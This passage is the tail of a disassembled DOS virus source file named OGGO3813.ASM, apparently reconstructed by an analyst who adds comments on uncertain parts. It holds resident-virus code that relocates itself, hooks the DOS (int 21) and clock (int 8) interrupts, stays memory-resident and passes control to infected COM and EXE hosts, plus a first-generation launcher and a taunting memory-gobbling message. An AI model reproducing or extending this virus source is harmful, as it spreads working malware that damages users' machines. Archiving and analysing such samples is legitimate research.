             db      11h,0ah,11h,0bh,11h,0ch,11h,0dh,11h,0eh,11h,0fh,11h,10h
             db      12h,9,12h,0ah,12h,0bh,12h,0ch,12h,0dh,12h,0eh,12h,0fh,13h
             db      9,13h,0ah,13h,0bh,13h,0ch,13h,0dh,13h,0eh,13h,0fh,14h,9
             db      14h,0ah,14h,0bh,14h,0ch,14h,0dh,14h,0eh,14h,0fh,15h,0ah
             db      15h,0bh,15h,0ch,15h,0dh,15h,0eh,16h,0ah,16h,0bh,16h,0ch
             db      16h,0dh,16h,0eh,17h,0bh,17h,0ch,17h,0dh,0feh,0feh

    FaceDat2 db      0ch,1,0ah,6,8,12h,8,16h,0ah,1ch,0ch,20h,0ch,24h,12h,26h
             db      18h,27h,1eh,27h,22h,26h,23h,24h,23h,18h,24h,14h,24h,0ah
             db      1eh,6,14h,1,12h,1,0eh,0feh,0feh

    MouthDat db      5,0ch,6,0ch,7,0dh,8,0dh,9,0dh,0ah,0eh,0bh,0eh,0ch,0eh,0dh
             db      0fh,0eh,0fh,0fh,0fh,10h,0fh,11h,10h,12h,10h,13h,10h,14h
             db      10h,15h,11h,16h,11h,17h,11h,18h,11h,19h,12h,1ah,12h,1bh
             db      12h,1ch,12h,1dh,13h,1eh,13h,1fh,13h,20h,13h,21h,13h,22h
             db      14h,23h,14h,24h,14h,25h,14h,26h,14h,27h,15h,28h,15h,29h
             db      15h,2ah,15h,2bh,15h,2ch,16h,2dh,16h,2eh,16h,2fh,16h,30h
             db      16h,31h,16h,32h,16h,33h,17h,34h,17h,35h,17h,36h,17h,37h
             db      17h,38h,17h,39h,17h,3ah,18h,3bh,18h,3ch,18h,3dh,18h,3eh
             db      18h,3fh,18h,40h,18h,41h,18h,42h,18h,43h,18h,44h,19h,45h
             db      19h,46h,19h,47h,19h,48h,19h,49h,19h,4ah,19h,4bh,19h,4ch
             db      19h,4dh,19h,4eh,19h,4fh,19h,50h,19h,51h,1ah,52h,1ah,53h
             db      1ah,54h,1ah,55h,1ah,56h,1ah,57h,1ah,58h,1ah,59h,1ah,5ah
             db      1ah,5bh,1ah,5ch,1ah,5dh,1ah,5eh,1ah,5fh,1ah,60h,1ah,61h
             db      1ah,62h,1ah,63h,1ah,64h,1ah,65h,1ah,66h,1ah,67h,1ah,68h
             db      1ah,69h,1ah,6ah,1ah,6bh,1ah,6ch,1ah,6dh,1ah,6eh,1ah,6fh
             db      1ah,70h,1ah,71h,1ah,72h,1ah,73h,1ah,74h,1ah,75h,1ah,76h
             db      1ah,77h,1ah,78h,19h,79h,19h,7ah,19h,7bh,19h,7ch,19h,7dh
             db      19h,7eh,19h,7fh,19h,80h,19h,81h,19h,82h,19h,83h,19h,84h
             db      19h,85h,18h,86h,18h,87h,18h,88h,18h,89h,18h,8ah,18h,8bh
             db      18h,8ch,18h,8dh,18h,8eh,18h,8fh,17h,90h,17h,91h,17h,92h
             db      17h,93h,17h,94h,17h,95h,17h,96h,16h,97h,16h,98h,16h,99h
             db      16h,9ah,16h,9bh,16h,9ch,16h,9dh,15h,9eh,15h,9fh,15h,0a0h
             db      15h,0a1h,15h,0a2h,14h,0a3h,14h,0a4h,14h,0a5h,14h,0a6h,14h
             db      0a7h,13h,0a8h,13h,0a9h,13h,0aah,13h,0abh,13h,0ach,12h,0adh
             db      12h,0aeh,12h,0afh,12h,0b0h,11h,0b1h,11h,0b2h,11h,0b3h,11h
             db      0b4h,10h,0b5h,10h,0b6h,10h,0b7h,10h,0b8h,0fh,0b9h,0fh,0bah
             db      0fh,0bbh,0fh,0bch,0eh,0bdh,0eh,0beh,0eh,0bfh,0dh,0c0h,0dh
             db      0c1h,0dh,0c2h,0ch,0c3h,0ch,0c4h,0ch,0feh,0feh

    isError:                           ; int 24 handler
          xor     ax,ax
          mov     es,ax
          mov     ss,es:SaveSsOnInt21
          mov     sp,es:SaveSpOnInt21
          pop     ax
          pop     es
          pop     bp
          stc
          ret

    UseDos:
          push    bp                             ; call to int 21
          push    es
          push    ax
          xor     ax,ax
          mov     es,ax
          mov     es:SaveSsOnInt21,ss
          mov     es:SaveSpOnInt21,sp
          pop     ax
          pop     es
          pushf
          call    DosInterrupt
          pop     bp
          ret

    Relay03:
          jmp     PrepareMoveCode

    MoveCode:
          repe movsb
          jmp     SetUpVirus

    PrepareMoveCode:
          pop     es                        ; copy code and relocate
          push    cs
          pop     ds
          push    si
          mov     ax,si
          mov     di,100h
          mov     cx,offset EndOfVirusCode+100h
          sub     cx,100h
          add     cx,si
          push    cx
          mov     si,0
          add     si,ax
          mov     cx,offset PrepareMoveCode-100h
          add     cx,ax
          repe movsb
          mov     bx,offset MoveCode-100h
          add     bx,100h
          pop     cx
          sub     cx,di
          mov     JumperOffset,bx
          mov     JumperSegment,es
          jmp     VirusJumper

    SetUpVirus:
          pop     si
          push    es
          xor     ax,ax
          mov     es,ax
          mov     word ptr es:MemoryMarkerLoc,1  ; set memory resident mark
          push    cs
          pop     ds
          pop     es
          mov     word ptr Psp,es           ; high byte of saved Psp would
          mov     di,0ah                    ;    be overwritten
          mov     bx,cs:[di]
          mov     TerminateOffset,bx
          mov     bx,cs:[di+2]
          mov     TerminateSegment,bx
          mov     dx,offset isTerminate-100h
          add     dx,100h
          mov     cs:[0ah],dx
          mov     dx,cs
          mov     cs:[0ch],dx
          mov     ax,3521h                  ; save int 21 vector
          int     21h
          mov     DosIntOffset,bx
          mov     DosIntSegment,es
          sub     ah,10h                    ; hook int 21
          mov     dx,offset isDos
          pushf
          call    DosInterrupt
          mov     Timer,0                   ; initialize counters
          mov     Minutes,0
          add     ah,10h                    ; save int 8 vector
          mov     al,8
          call    UseDos
          mov     ClockIntOffset,bx
          mov     ClockIntSegment,es
          sub     ah,10h                    ; hook int 8
          mov     dx,offset isClock
          call    UseDos
          push    ds
          pop     es
          mov     ah,49h
          call    UseDos
          mov     dx,1271h           ; tsr 4721 paras = 75536 bytes
          mov     ah,31h             ; I don't know how the author
          pushf                      ;    got this figure
          call    DosInterrupt

    isTerminate:
          mov     ax,cs
          mov     ds,ax
          mov     di,offset TerminateOffset
          mov     bx,cs:[di+2]
          mov     cs:[0ch],bx
    ;--------------------------------------------------------------------
    ; This is a check if it is a first generation. We don't exactly what
    ; the first gen codes are. It is possible for the check to return
    ; a match even if it is not a first gen.
    ;--------------------------------------------------------------------
          mov     ax,cs
          mov     ds,ax
          mov     si,(offset EndOfVirusCode+200h)+5
          mov     dx,cs:[si]
          cmp     dx,-2                     ; am i a first gen?
          jne     NotFirstGen
          jmp     (EndOfVirusCode+200h)+7   ; return to first gen codes

    NotFirstGen:
          push    cs
          pop     es
          mov     ax,offset EndOfVirusCode-2     ; init exec param????
          mov     di,offset ExecParam+2
          mov     cs:[di],ax
          mov     ax,cs
          mov     cs:[di+2],ax
          mov     bx,offset ExecParam
          mov     ViruSs,ss
          mov     ViruSp,sp
          mov     dx,offset Asciiz+3
          mov     ah,4bh
          mov     al,0
          pushf
          call    DosInterrupt
          push    cs
          pop     ds
          cli
          mov     si,offset ViruSs
          mov     ss,cs:[si]
          mov     sp,cs:[si+2]                   ; sp value is now wrong
          sti
          mov     ah,4dh
          int     21h
          mov     ah,4ch
          int     21h

    VirusIsInMemory:
          mov     di,offset FileTypeFlag-100h    ; determine host file type
          add     di,si
          mov     al,cs:[di]
          cmp     al,1
          je      HostIsExe
          jmp     HostIsCom

    HostIsExe:
          pop     es                             ; execute host exe
          mov     di,offset ExeSs-100h
          add     di,si
          mov     ax,es
          add     ax,cs:[di]
          add     ax,16
          mov     ss,ax
          mov     sp,cs:[di+2]
          mov     di,offset ExeIp-100h
          add     di,si
          mov     ax,cs:[di]
          mov     cs:[si+(offset HostExeOffset-100h)],ax
          mov     di,offset ExeCs-100h
          add     di,si
          mov     ax,es
          add     ax,cs:[di]
          add     ax,16
          mov     cs:[si+(offset HostExeSegment-100h)],ax
          clc
          jmp     dword ptr cs:[si+(offset ExecuteHostExe-100h)]

    HostIsCom:
          pop     es                             ; execute host com
          mov     di,offset ComLength-100h
          add     di,si
          mov     cx,cs:[di]
          add     cx,offset EndOfVirusCode       ; get location of host
          jmp     cx                             ;   code restorer at eof

    ExecParam   dw      0,0,0,0,0,0,0
                db      0,13

    EndOfVirusCode:
    ;--------------------------------------------------
    ; Host COM program codes starts here.
    ;--------------------------------------------------
    ;==================================================
    ;--------------------------------------------------
    ; This is not the original first generation codes.
    ; What that is we won't know for sure.
    ;--------------------------------------------------

       db    10,'Oggo just gobbled up a large chunk of your memory',13,10,'$'

    FirstGeneration:
          pop     ax
          xor     ax,ax
          push    cs
          pop     ds
          mov     word ptr OggoEntry+1,ax
          mov     ax,3521h
          int     21h
          mov     DosIntOffset,bx
          mov     DosIntSegment,es
          mov     ax,3508h
          int     21h
          mov     ClockIntOffset,bx
          mov     ClockIntSegment,es
          mov     Timer,0
          mov     Minutes,0
          mov     dx,offset isDos
          mov     ax,2521h
          int     21h
          mov     ax,2508h
          mov     dx,offset isClock
          int     21h
          push    cs
          pop     es
          mov     dx,offset EndOfVirusCode-1
          mov     ah,9
          int     21h
          mov     dx,1271h
          mov     ax,3100h
          int     21h

    Oggo3813 ends

    end OggoEntry


   ; ÄÄ OGGO3813.ASM ENDS HERE ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
